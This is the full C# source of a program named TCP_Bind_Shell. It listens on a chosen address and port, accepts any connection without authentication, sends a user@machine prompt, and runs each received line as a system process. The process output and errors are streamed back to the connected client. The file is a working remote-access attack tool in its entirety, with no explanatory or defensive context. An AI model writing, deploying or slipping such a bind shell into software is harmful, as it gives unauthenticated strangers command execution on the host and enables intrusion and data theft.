using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Linq;
using System.Diagnostics;

namespace TCP_Bind_Shell {
    class Program {
        static void Main(string[] args) {
            IPAddress host = IPAddress.Any;
            int port;
            if (args.Length < 1) {
                throw new ArgumentException("Usage: application [<bind-address>] <bind-port>");
            }

            // parsing arguments
            if (args.Length == 1) {
                port = Convert.ToInt32(args[0]);
            } else {
                port = Convert.ToInt32(args[1]);
                host = IPAddress.Parse(args[0]);
            }

            // creating the server and listening on the port
            var server = new TcpListener(host, port);
            server.Start();

            while (true) {
                // accepting connection as tcp client
                using(var client = server.AcceptTcpClient()) {
                    // get client ip address and port number
                    string clientAddr = client.Client.RemoteEndPoint.ToString();

                    Console.WriteLine("[+] Client Connected: {0}", clientAddr);

                    // get streams
                    var stream = client.GetStream();
                    var wr = new StreamWriter(stream) { AutoFlush = true };
                    var rd = new StreamReader(stream);

                    Console.WriteLine("[+] Start Reading Inputs");

                    while (true) {
                        // seding the banner and prompt
                        wr.Write(string.Format("{0}@{1} $ ", Environment.UserName, Environment.MachineName));
                        
                         // skip when input is emptpy, null or whitespace
                         // exit if cmd is sent to be exit
                        var cmd = rd.ReadLine().Trim().ToLower();
                        if (string.IsNullOrEmpty(cmd) || string.IsNullOrWhiteSpace(cmd)) {
                            continue;
                        } else if (cmd == "exit") {
                            break;
                        }
                           
                        // preprocess command line recievided from client
                        string[] parts = cmd.Split(' ');
                        string fileName = parts.First();
                        string cmdArgs = string.Join(' ', parts.Skip(1).ToArray());
                        
                        // instantiate process
                        Process process = new Process() {
                            StartInfo = new ProcessStartInfo(fileName, cmdArgs) {
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true
                            }
                        };

                        // spawn process and return output
                        try {
                            process.Start();
                            process.StandardOutput.BaseStream.CopyTo(stream);
                            process.StandardError.BaseStream.CopyTo(stream);
                            process.WaitForExit();
                            Console.WriteLine("[+] Executed '{0}'", cmd);
                        } catch(Exception e) {
                            wr.WriteLine(e.Message);
                            Console.WriteLine("[x] Failed to Execute '{0}'", cmd);
                        }
                    }

                    Console.WriteLine("[+] Releasing Resources for {0}", clientAddr);
                    // closing other stream
                    rd.Close();
                    wr.Close();
                    stream.Close();
                }
            }
        }
    }
}
